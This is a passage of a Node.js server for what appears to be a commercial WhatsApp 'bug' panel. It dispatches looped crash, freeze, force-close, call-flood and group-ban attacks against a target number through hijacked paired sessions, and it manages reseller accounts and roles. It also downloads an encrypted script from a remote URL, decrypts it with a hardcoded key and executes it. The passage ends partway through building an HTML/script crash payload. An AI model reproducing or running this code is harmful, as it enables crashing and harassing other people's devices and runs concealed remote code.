        case "crash_spam":
          for (let i = 0; i < 15; i++) {
            await BlankNew(sock, targetJid);
            await sleep(500);
            await system(sock, targetJid);
            await sleep(500);
            await kontol(sock, targetJid);
            await sleep(500);
          }
          break;

        case "hard":
          for (let i = 0; i < 10; i++) {
            await DelayInvisible(sock, targetJid);
            await sleep(300);
            await DelayXBlank(sock, targetJid);
            await sleep(300);
            await system(sock, targetJid);
            await sleep(300);
            await kontol(sock, targetJid);
            await sleep(300);
            await XcvBebasSpam(sock, targetJid);
            await sleep(200);
          }
          break;

        case "crashXdelay":
          for (let i = 0; i < 20; i++) {
            await Crshlogdelay(sock, targetJid);
            await sleep(500);
          }
          break;

        case "android":
          for (let i = 0; i < 25; i++) {
            await Crshlogdelay(sock, targetJid);
            await sleep(200);
            await BlankClick(sock, targetJid);
            await sleep(200);
          }
          break;
          
        case "fc_invis":
          for (let i = 0; i < 50; i++) {
            await fcNewCelah(sock, targetJid);
            await sleep(300);
           }
           break;

          case "lock":
          for (let i = 0; i < 50; i++) {
            await RulxzXD(sock, targetJid);
            await sleep(300);
           }
           break;
          
        case "fc":
          for (let i = 0; i < 50; i++) {
            await zyon(sock, targetJid);
            await sleep(3000);
          }
          break;

        case "blanknew":
          for (let i = 0; i < 20; i++) {
            await Blclck(sock, targetJid);
            await sleep(1500);
          }
          break;
          
       case "ban_group":
          for (let i = 0; i < 20; i++) {
            await nukeGB(sock, targetJid);
            await sleep(100);
          }
          break;

        case "XcvBebasSpam":
          for (let z = 0; z < 30; z++) {
            await safeDelay(sock, targetJid);
            await sleep(400);
          }
          break;

        case "delay":
          for (let i = 0; i < 30; i++) {
            await ikyyoffc(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "delayxblank":
          for (let i = 0; i < 500; i++) {
            await DelayXBlank(sock, targetJid);
            await sleep(1000);
            await DelayInvisible(sock, targetJid);
            await sleep(1000);
          }
          break;

        case "gacor_full":
          console.log("[🔥 GACOR] Full combo started");
          const combo = async () => {
            await Promise.allSettled([
              RulzxNieh(sock, targetJid),
              RulzxNieh(sock, targetJid),
              RulzxNieh(sock, targetJid),
            ]);
          };
          for (let i = 0; i < 30; i++) {
            await safeDelay();
            await RulzxNieh(sock, targetJid);
            await sleep(500);
          }
          break;

        case "bug_grup":
          for (let i = 0; i < 40; i++) {
            await Frezee(sock, targetJid);
            await sleep(1000);
            await bugGroup(sock, targetJid);
            await sleep(100);
          }
          break;

        case "call_flood":
          for (let i = 0; i < 40; i++) {
            await kontol(sock, targetJid);
            await sleep(100);
            await system(sock, targetJid);
            await sleep(100);
          }
          break;

        case "matrix":
          console.log("[⚡ MATRIX] Parallel attack started");
          for (let r = 0; r < 20; r++) {
            await Promise.allSettled([
              DelayInvisible(sock, targetJid),
              DelayXBlank(sock, targetJid),
              Forceclose(sock, targetJid),
              BlankNew(sock, targetJid),
              Crshlogdelay(sock, targetJid),
              BlankClick(sock, targetJid),
              Frezee(sock, targetJid), 
              ForceInvis(sock, targetJid),
            ]);
            await sleep(200);
          }
          break;
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (['vip', 'admin', 'tk', 'owner', 'high owner', 'kingz', 'founder', 'developer'].includes(role)) {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

const publicSenderSet = new Set(JSON.parse(require('fs').existsSync('./publicSenders.json') 
  ? require('fs').readFileSync('./publicSenders.json','utf8') : '[]'));

function savePublicSenders() {
  require('fs').writeFileSync('./publicSenders.json', JSON.stringify([...publicSenderSet]));
}

if (!fs.existsSync('./publicSenders.json')) {
  fs.writeFileSync('./publicSenders.json', '[]');
}

// ═══════════════════════════════════════════════════════════════════════════
// GET PUBLIC SENDERS — DENGAN TIMESTAMP 24 JAM OFFLINE
// ═══════════════════════════════════════════════════════════════════════════

// ─── TRACK KAPAN SENDER TERAKHIR ONLINE ──────────────────────────────
const publicSenderLastOnline = {};  // { session: timestamp }

// Init dari publicSenderSet kalau ada
try {
  if (fs.existsSync('./publicSenderTimestamps.json')) {
    const saved = JSON.parse(fs.readFileSync('./publicSenderTimestamps.json', 'utf8'));
    Object.assign(publicSenderLastOnline, saved);
    console.log(`[⏱️ TIMESTAMPS] Loaded ${Object.keys(saved).length} timestamp dari file`);
  }
} catch (e) {
  console.error('[❌ TIMESTAMPS] Load error:', e.message);
}

function savePublicSenderTimestamps() {
  try {
    fs.writeFileSync('./publicSenderTimestamps.json', JSON.stringify(publicSenderLastOnline, null, 2));
  } catch (e) {
    console.error('[❌ TIMESTAMPS] Save error:', e.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// ENDPOINT: GET /getPublicSenders
// ═══════════════════════════════════════════════════════════════════════════
app.get("/getPublicSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false });

  const now = Date.now();
  const OFFLINE_TIMEOUT = 24 * 60 * 60 * 1000;  // ✅ 24 JAM dalam ms

  const publicSenders = [];
  const toDelete = [];

  for (const session of publicSenderSet) {
    const sock = activeConnections[session];
    const isActive = !!sock && sock?.ws?.readyState === 1;

    if (isActive) {
      // ✅ ONLINE — update timestamp terakhir online
      publicSenderLastOnline[session] = now;
      publicSenders.push({ 
        session, 
        isActive: true, 
        status: 'online' 
      });
    } else {
      // ⏳ OFFLINE — cek berapa lama sudah offline
      const lastOnline = publicSenderLastOnline[session] || 0;
      const offlineDuration = now - lastOnline;

      if (offlineDuration >= OFFLINE_TIMEOUT) {
        // 🗑️ SUDAH 24 JAM OFFLINE → HAPUS
        const hoursOffline = (offlineDuration / (60 * 60 * 1000)).toFixed(1);
        console.log(`[🧹] Auto-hapus sender offline 24+ jam: ${session} (${hoursOffline} jam offline)`);
        toDelete.push(session);
      } else {
        // 🟡 MASIH DALAM 24 JAM → TETAP TAMPIL DENGAN STATUS OFFLINE
        const minutesOffline = Math.floor(offlineDuration / (60 * 1000));
        publicSenders.push({ 
          session, 
          isActive: false, 
          status: 'offline',
          offlineMinutes: minutesOffline,
          offlineSince: new Date(lastOnline).toISOString()
        });
        console.log(`[🟡] Sender ${session} offline ${minutesOffline} menit (belum 24 jam)`);
      }
    }
  }

  // ─── HAPUS YANG SUDAH 24 JAM OFFLINE ──────────────────────────────
  if (toDelete.length > 0) {
    for (const session of toDelete) {
      publicSenderSet.delete(session);
      delete publicSenderLastOnline[session];
    }
    savePublicSenders();
    savePublicSenderTimestamps();
    console.log(`[✅ CLEANUP] ${toDelete.length} sender dihapus. Sisa: ${publicSenderSet.size}`);
  }

  // ─── SIMPAN TIMESTAMP ─────────────────────────────────────────────
  if (publicSenders.some(s => s.isActive)) {
    savePublicSenderTimestamps();
  }

  res.json({ 
    valid: true, 
    senders: publicSenders,
    total: publicSenders.length,
    online: publicSenders.filter(s => s.isActive).length,
    offline: publicSenders.filter(s => !s.isActive).length
  });
});

app.get("/setSenderPublic", (req, res) => {
  const { key, session, public: makePublic } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, error: "User not found" });

  if (makePublic === 'true') {
    publicSenderSet.add(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan public` });
  } else {
    if (!['developer', 'founder', 'kingz', 'high owner', 'owner'].includes(user.role)) {
      return res.status(403).json({ valid: false, error: "Hanya owner yang bisa remove public sender" });
    }
    publicSenderSet.delete(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan private` });
  }
});

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!allowedActiveSendersRoles.includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  const specialRoles = ['vip', 'admin', 'tk', 'owner', 'high owner', 'kingz', 'founder', 'developer'];
  if (specialRoles.includes(user.role)) {
    console.log(`[${user.username}] Request mySender (Special Mode)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  const privateConns = conns.map(c => ({
    sessionName: c.sessionName,
    number: c.sessionName,
    type: 'private',
    status: 'connected',
    isPublic: publicSenderSet.has(c.sessionName)
  }));

  return res.json({
    valid: true,
    connections: {
      private: privateConns,
      global: privateConns.filter(c => c.isPublic)
    },
    senderList: privateConns,
    total: privateConns.length
  });
});

const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (require('fs').existsSync(devicePermFile)) {
      return JSON.parse(require('fs').readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  require('fs').writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester && ['developer', 'founder', 'kingz', 'high owner', 'owner'].includes(requester.role) && keyInfo.username === username) {
    return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
  }
  
  return res.json({ valid: true, ...userPerm });
});

app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || !['developer', 'founder', 'kingz', 'high owner', 'owner'].includes(requester.role)) {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || !['developer', 'founder', 'kingz', 'high owner', 'owner'].includes(requester.role)) {
    return res.status(403).json({ valid: false, error: "Only owner" });
  }
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

app.get("/getPairing", async (req, res) => {
  const { key, number, type } = req.query;   // ✅ TAMBAH type
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  // ✅ TENTUKAN FOLDER BERDASARKAN TYPE
  const senderType = (type || 'private').toLowerCase();
  let sessionDir;

  if (senderType === 'global') {
    // ✅ GLOBAL → folder vip/ (global pool)
    const vipFolder = path.join('vip');
    if (!fs.existsSync(vipFolder)) fs.mkdirSync(vipFolder, { recursive: true });
    sessionDir = path.join(vipFolder, number);
    console.log(`[🌍 GLOBAL PAIRING] ${user.username} → ${number}`);
  } else {
    // ✅ PRIVATE → folder permenmd/{username}/{number}
    const userFolder = path.join('permenmd', user.username);
    if (!fs.existsSync(userFolder)) fs.mkdirSync(userFolder, { recursive: true });
    sessionDir = path.join(userFolder, number);
    console.log(`[🔒 PRIVATE PAIRING] ${user.username} → ${number}`);
  }

  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username, 1, senderType); // ✅ pass type
        } else {
          delete activeConnections[number];
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      console.log(`[✅ PAIRING CODE] ${senderType.toUpperCase()} - ${number}: ${code}`);
      
      // ✅ Simpan info session global ke publicSenderSet
      if (senderType === 'global') {
        console.log(`[🌍 GLOBAL] Will register ${number} as public sender after connect`);
      }
      
      if (code) {
        return res.json({ 
          valid: true, 
          number, 
          type: senderType,
          pairingCode: code 
        });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !allowedCreateRoles.includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const currentLimit = roleLimits[creator.role] || 30;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "You cannot delete a user with higher or equal rank." 
    });
  }

  if (deleter.role === 'founder' && targetUser.role === 'developer') {
    return res.json({ valid: true, authorized: false, message: "Founder cannot delete Developer." });
  } else if (deleter.role === 'kingz' && ['developer', 'founder'].includes(targetUser.role)) {
    return res.json({ valid: true, authorized: false, message: "Kingz cannot delete Developer/Founder." });
  } else if (deleter.role === 'high owner' && ['developer', 'founder', 'kingz'].includes(targetUser.role)) {
    return res.json({ valid: true, authorized: false, message: "High Owner cannot delete Developer/Founder/Kingz." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !allowedListRoles.includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    pairId: u.pairId || null,
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const currentLimit = roleLimits[creatorRole] || 30;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  const allowedEditRoles = ['developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin', 'reseller'];
  if (!editor || !allowedEditRoles.includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
    return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || !allowedLogRoles.includes(user.role)) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function RulxzXD(sock, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
